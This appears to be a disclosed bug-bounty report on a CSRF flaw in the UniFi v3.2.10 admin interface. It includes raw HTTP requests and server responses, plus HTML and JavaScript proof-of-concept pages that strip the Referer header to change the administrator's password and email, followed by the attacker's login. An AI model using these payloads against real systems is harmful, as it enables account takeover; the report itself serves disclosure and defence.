@@ -1,0 +1,180 @@
+ReportLink:https://hackerone.com/reports/52635
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/mrtuxracer
+ReportedTo:Ubiquiti Networks(ubnt)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:07.01.2016 20:31:59
+
+Summary:
+
+VULNERABILITY DESCRIPTION
+-----------
+The application UniFi v3.2.10 uses JSON requests to add/edit/save/delete configuration options on the administrative web-interface, but the application has an insufficient Cross-Site Request Forgery protection in place by  only checking whether the Referer Header is present and if its actual value matches the host where the system is running (default: 127.0.0.1).
+
+VERSIONS AFFECTED
+------------
+UniFi v3.2.10 
+older versions may be affected too.
+
+PROOF-OF-CONCEPT (Steps to reproduce):
+---------------
+The following Proof-of-Concept will bypass the CSRF protection and change the password of the administrator. Basically all functionalities are vulnerable on the same way.
+
+Therefore a typical request to change the password of the user "admin" to "test" looks like the following when issued using the web interface:
+
+    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1
+    Connection: keep-alive
+    Content-Length: 163
+    Accept: */*
+    Origin: https://127.0.0.1:8443
+    X-Requested-With: XMLHttpRequest
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) > Chrome/39.0.2171.95 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Referer: https://127.0.0.1:8443/manage/s/default
+    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4
+    Cookie: unifises=742beba0de5c180ed18233629918a217
+    Host: 127.0.0.1:8443
+    
+    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22test%22%2C%22email%22%3A%22admin%40admin.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D
+
+The following script (ubi_common_csrf.php) tries to exploit this vulnerability by changing the email address of the user "admin" to "info@rcesecurity.com" and the associated password to "csrfpwd":
+
+    <html>
+    <form action="https://127.0.0.1:8443/api/s/default/cmd/sitemgr" method="post" enctype="text/plain">
+    <input name="json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%2$
+    <input type=submit>
+    </form>
+    </html>
+
+This would lead to the following HTTP POST request with the HTTP Referer header set to e.g. http://www.rcesecurity.com, where the CSRF script is placed:
+
+    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1
+    Connection: keep-alive
+    Content-Length: 173
+    Cache-Control: max-age=0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Origin: http://www.rcesecurity.com
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36
+    Content-Type: text/plain
+    Referer: http://www.rcesecurity.com/pocs/common_csrf.php
+    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4
+    Cookie: unifises=742beba0de5c180ed18233629918a217
+    Host: 127.0.0.1:8443
+    
+    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==
+
+In this case the application correctly responds with an HTTP 401 error code denying the password change:
+
+    HTTP/1.1 401 Unauthorized
+    Server: Apache-Coyote/1.1
+    Content-Type: application/json;charset=ISO-8859-1
+    Content-Length: 78
+    Date: Thu, 19 Mar 2015 17:24:53 GMT
+
+    { "data" : [ ] , "meta" : { "msg" : "api.err.LoginRequired" , "rc" : "error"}}
+
+But if the HTTP Referer-Header is stripped out from the HTTP Request:
+
+    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1
+    Connection: keep-alive
+    Content-Length: 173
+    Cache-Control: max-age=0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Origin: http://www.rcesecurity.com
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+    Content-Type: text/plain
+    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4
+    Cookie: unifises=742beba0de5c180ed18233629918a217
+    Host: 127.0.0.1:8443
+    
+    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==
+
+The application answers with an HTTP 200 code and the password was successfully changed:
+
+    HTTP/1.1 200 OK
+    Server: Apache-Coyote/1.1
+    Content-Type: application/json;charset=ISO-8859-1
+    Content-Length: 41
+    Date: Thu, 19 Mar 2015 17:28:21 GMT
+    
+    { "data" : [ ] , "meta" : { "rc" : "ok"}}
+
+So all an attacker has to to is to strip out the HTTP Referer Header in a CSRF attack scenario like using the following script (ubi_passwd_change.php):
+
+    <html>
+    <head>
+    <script>
+    function load() {
+        var postdata = '<form id=csrf method=POST enctype=\'text\/plain\' action=\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\'>' +
+                        '<input type=hidden name=\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\' value=\'\' />' +
+                        '</form>';
+        top.frames[0].document.body.innerHTML=postdata;
+        top.frames[0].document.getElementById('csrf').submit();
+    }
+    </script>
+    </head>
+    <body onload="load()">
+    <iframe src="about:blank" id="noreferer">< /iframe>
+
+The HTTP POST request issued by the script looks like the following (notice that the Referer Header is missing):
+
+    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1
+    Connection: keep-alive
+    Content-Length: 172
+    Cache-Control: max-age=0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Origin: http://www.rcesecurity.com
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36
+    Content-Type: text/plain
+    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4
+    Cookie: unifises=742beba0de5c180ed18233629918a217
+    Host: 127.0.0.1:8443
+    
+    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D=
+
+And the application responds with an HTTP 200 code again:
+
+    HTTP/1.1 200 OK
+    Server: Apache-Coyote/1.1
+    Content-Type: application/json;charset=ISO-8859-1
+    Content-Length: 41
+    Date: Thu, 19 Mar 2015 17:31:25 GMT
+    
+    { "data" : [ ] , "meta" : { "rc" : "ok"}}
+
+The attacker is now able to login to the UniFi interface using the following request:
+
+    POST https://127.0.0.1:8443/login HTTP/1.1
+    Connection: keep-alive
+    Content-Length: 43
+    Cache-Control: max-age=0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Origin: https://127.0.0.1:8443
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Referer: https://127.0.0.1:8443/login
+    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4
+    Host: 127.0.0.1:8443
+    
+    username=admin&password=csrfpwd&login=Login
+
+Whereas the application responds with an HTTP 302 code:
+
+    HTTP/1.1 302 Found
+    Server: Apache-Coyote/1.1
+    Set-Cookie: unifises=69f8ad84135bd1a2715e1530d4e07698; Path=/; Secure; HttpOnly
+    Location: https://127.0.0.1:8443/manage/s/default
+    Content-Type: text/html;charset=UTF-8
+    Content-Length: 0
+    Date: Thu, 19 Mar 2015 17:39:29 GMT
+
+Attached you'll find the following files to help investigate the issue:
+poc-0.png - Screenshot of changed user "admin"
+
+The used CSRF scripts are live on my domain www.rcesecurity.com during your investigations:
+http://www.rcesecurity.com/pocs/ubi_common_csrf.php
+http://www.rcesecurity.com/pocs/ubi_passwd_change.php
+
+If you need any further assistance or PoCs please just let me know.
